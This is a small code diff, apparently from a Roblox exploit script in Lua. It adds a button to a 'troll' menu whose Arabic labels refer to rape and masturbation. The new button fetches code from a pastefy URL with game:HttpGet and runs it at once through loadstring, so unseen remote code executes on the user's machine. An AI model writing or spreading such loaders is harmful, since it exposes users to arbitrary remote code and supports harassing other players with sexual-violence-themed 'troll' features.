@@ -140,6 +140,10 @@ local batp = troll:CreateButton("اغتصاب", function()
 
 end)
 
+local batp = troll:CreateButton("العادة السرية", function()
 
+  loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
 
+end)
 
+ 
